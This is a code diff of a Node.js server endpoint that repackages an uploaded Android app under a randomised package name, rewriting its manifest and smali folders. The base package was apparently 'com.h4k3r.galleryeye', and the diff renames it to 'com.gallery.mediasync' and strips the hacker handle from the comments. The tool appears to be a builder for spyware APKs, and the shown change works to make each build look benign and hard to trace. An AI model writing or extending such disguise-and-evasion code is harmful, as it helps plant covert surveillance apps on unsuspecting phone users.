@@ -141,7 +141,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 letters[Math.floor(Math.random() * 26)];
 
             const newPackageName = `com.${cleanAppName}.${randomSuffix}`;
-            const oldPackageName = 'com.h4k3r.galleryeye';
+            const oldPackageName = 'com.gallery.mediasync';
 
             // Update AndroidManifest.xml
             if (fs.existsSync(manifestPath)) {
@@ -178,7 +178,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             // 2.7. Physically rename smali directories to match new package name
             // Without this, Android can't find classes at runtime (directory path = class path)
-            const oldPathSegments = oldPackageName.split('.'); // ['com', 'h4k3r', 'galleryeye']
+            const oldPathSegments = oldPackageName.split('.'); // ['com', 'gallery', 'mediasync']
             const newPathSegments = newPackageName.split('.'); // ['com', 'gallery', 'wlxy']
 
             const renameSmaliFolders = (baseSmaliDir) => {
@@ -200,9 +200,9 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
                 // Remove old empty directories (walk up from deepest)
                 try {
-                    // Remove 'galleryeye' dir
+                    // Remove 'mediasync' dir
                     fs.rmdirSync(oldSmaliPath);
-                    // Remove 'h4k3r' dir if empty
+                    // Remove parent dir if empty
                     const parentDir = path.dirname(oldSmaliPath);
                     if (fs.existsSync(parentDir) && fs.readdirSync(parentDir).length === 0) {
                         fs.rmdirSync(parentDir);
